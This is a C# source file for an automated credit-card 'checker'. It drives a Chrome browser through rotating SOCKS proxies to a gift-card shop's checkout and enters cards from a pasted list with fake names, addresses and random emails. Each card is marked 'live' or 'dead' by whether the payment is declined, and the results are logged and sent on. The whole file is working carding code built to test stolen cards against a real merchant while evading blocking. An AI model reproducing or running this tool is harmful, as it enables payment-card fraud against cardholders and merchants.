using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Gift
    {
        check check = new check();
        Socks socks = new Socks();
        ChromeDriver driver;
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        string error = "";
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 300)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();
                var prox = socks.proxy();

                var ip = prox.Split(':');

                var ipUp = ip[1].ToString().Replace("//", "");
                //  MessageBox.Show(ipUp);


                //Proxy proxy = new Proxy();
                //proxy.Kind = ProxyKind.Manual;
                //proxy.IsAutoDetect = false;
                //proxy.HttpProxy =
                //proxy.SslProxy = "127.0.0.1:3330";
                //chromeOptions.Proxy = proxy;

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--proxy-server=" + prox, "--ignore-certificate-errors");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                try
                {
                    driver.Url = "http://www.giftfly.com/shop/danny";
                    //driver.Url = "https://whatismyipaddress.com/es/mi-ip";
                }
                catch (Exception)
                {
                    socks.proxyUp(ipUp);
                    restart();
                }

                Thread.Sleep(2000);
                Form1.circularProgressBar1.Value = 10;
                correo = "joseffernana" + getNum() + "@hotmail.com";



                if (IsElementPresent(By.XPath("//*[@id='main-message']/h1/span")))
                {
                    socks.proxyUp(ipUp);
                    restart();
                }

                if (IsElementPresent(By.XPath("/html/body")))
                {
                    if (driver.FindElement(By.XPath("/html/body")).Text.Trim() == "Backend not available")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("/html/body/div/div[1]/h1")))
                {
                    if (driver.FindElement(By.XPath("/html/body/div/div[1]/h1")).Text.Trim() == "Custom Message")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("/html/body/h2")))
                {
                    if (driver.FindElement(By.XPath("/html/body/h2")).Text.Trim() == "502 Bad Gateway")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("//*[@id='titles']/h1")))
                {
                    if (driver.FindElement(By.XPath("//*[@id='titles']/h1")).Text.Trim() == "ERROR")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                

                if (IsElementPresent(By.XPath("//*[@id='cf-error-details']/header/h1/span[2]")))
                {
                    if (driver.FindElement(By.XPath("//*[@id='cf-error-details']/header/h1/span[2]")).Text.Trim() == "1001")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                



                if (tiempoElemento(By.XPath("//*[@id='edit-gift-card-page']/div/div[2]/div[1]/label")))
                {
                    Thread.Sleep(5000);
                    driver.FindElement(By.XPath("//*[@id='edit-gift-card-page']/div/div[2]/div[1]/label")).Click();
                    Thread.Sleep(5000);
                    driver.FindElement(By.XPath("//*[@id='title']")).SendKeys("DAVID");
                    driver.FindElement(By.XPath("//*[@id='sender_name']")).SendKeys("JOSE");
                    driver.FindElement(By.XPath("//*[@id='sender_email']")).SendKeys(correo);
                    //driver.FindElement(By.XPath("//*[@id='receiver_name']")).SendKeys("DAVID");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("//*[@id='edit-gift-card-page']/div/div[2]/div[7]")).Click();
                    Thread.Sleep(5000);

                    if (IsElementPresent(By.XPath("//*[@id='edit-gift-card-page']/div/div[2]/div[2]/div[2]/div/div")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='edit-gift-card-page']/div/div[2]/div[2]/div[2]/div/div")).Displayed==true)
                        {
                            socks.proxyUp(ipUp);
                            restart();
                        }
                    }

                    if (tiempoElemento(By.XPath("//*[@id='shopping-cart-page']/div[3]/div[2]/div/div[4]/div/div/p/input")))
                    {
                        driver.FindElement(By.XPath("//*[@id='shopping-cart-page']/div[3]/div[2]/div/div[4]/div/div/p/input")).Submit();
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.XPath("//*[@id='cc_payment_name']")))
                        {
                            pago();
                        }
                        else
                        {
                            restart();
                        }

                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    restart();
                }
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                driver.Close();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex);
            }

            driver.Quit();
            pagos = 0;
            load();
        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 5)
                    {
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        var ccmes = ccLine[1];
                        var ccanio = ccLine[2].Remove(0, 2);

                        Form1.circularProgressBar1.Value = 80;

                        driver.FindElement(By.XPath("//*[@id='cc_payment_name']")).SendKeys("KANO ESTRELLA");
                        Thread.Sleep(500);
                        driver.FindElement(By.XPath("//*[@id='cc_payment_address1']")).SendKeys("STREET 33"+RandomNumber(1,50));
                        Thread.Sleep(500);
                        driver.FindElement(By.XPath("//*[@id='cc_payment_city']")).SendKeys("NY");
                        Thread.Sleep(500);
                        var state=new SelectElement( driver.FindElement(By.XPath("//*[@id='payment-creditcard-state']")));
                        state.SelectByValue("NY");
                        Thread.Sleep(500);
                        driver.FindElement(By.XPath("//*[@id='cc_payment_zipcode']")).SendKeys("10001");
                        Thread.Sleep(2000);

                        if (tiempoElemento(By.XPath("//*[@id='checkout-page']/div[2]/div/div[6]/div/div/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='checkout-page']/div[2]/div/div[6]/div/div/div/iframe")));
                            Thread.Sleep(1000);

                            for (var i = 0; i <= ccnum.Length - 1; i++)
                            {
                                driver.FindElement(By.XPath("//*[@id='root']/form/div/div[2]/span[1]/span[2]/div/div[2]/span/input")).SendKeys(ccnum[i].ToString());
                                Thread.Sleep(200);
                            }

                            Thread.Sleep(500);

                            for (var i = 0; i <= 1; i++)
                            {
                                driver.FindElement(By.XPath("//*[@id='root']/form/div/div[2]/span[2]/span/span/input")).SendKeys(ccmes[i].ToString());
                                Thread.Sleep(200);
                            }

                            Thread.Sleep(500);

                            for (var i = 0; i <= 1; i++)
                            {
                                driver.FindElement(By.XPath("//*[@id='root']/form/div/div[2]/span[2]/span/span/input")).SendKeys(ccanio[i].ToString());
                                Thread.Sleep(200);
                            }

                            Thread.Sleep(500);

                            driver.FindElement(By.XPath("//*[@id='root']/form/div/div[2]/span[3]/span/span/input")).SendKeys(ccLine[3]);
                            Thread.Sleep(500);
                            driver.SwitchTo().ParentFrame();
                            Thread.Sleep(1000);

                            Form1.circularProgressBar1.Value = 90;
                            driver.FindElement(By.XPath("//*[@id='checkout-page']/div[3]/div/div/label")).Click();
                            Thread.Sleep(500);
                            driver.FindElement(By.XPath("//*[@id='checkout-page']/div[4]/div[2]/div")).Click();
                            Thread.Sleep(5000);

                        }
                        else
                        {
                            restart();
                        }


                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }


                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {


                    if (IsElementPresent(By.XPath("//*[@id='checkout-page']/div[2]/div/div[8]/div/div/p")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='checkout-page']/div[2]/div/div[8]/div/div/p")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='checkout-page']/div[2]/div/div[8]/div/div/p")).Text.Trim() != "")
                            {
                                error = driver.FindElement(By.XPath("//*[@id='checkout-page']/div[2]/div/div[8]/div/div/p")).Text;
                                estado = "dead";
                            }
                            //else
                            //{
                            //    estado = "live";
                            //}
                        }
                    }


                    //if (IsElementPresent(By.XPath("//*[@id='download-marker-arrow-up']/div/div/div/h2")))
                    //{
                    //    if (driver.FindElement(By.XPath("//*[@id='download-marker-arrow-up']/div/div/div/h2")).Displayed == true)
                    //    {
                    //        if (driver.FindElement(By.XPath("//*[@id='download-marker-arrow-up']/div/div/div/h2")).Text.Trim() != "")
                    //        {
                    //            error = driver.FindElement(By.XPath("//*[@id='download-marker-arrow-up']/div/div/div/h2")).Text;
                    //            estado = "live";
                    //        }
                    //        //else
                    //        //{
                    //        //    estado = "live";
                    //        //}
                    //    }
                    //}


                }
                else
                {
                    estado = "live";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                Console.WriteLine(error);
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}
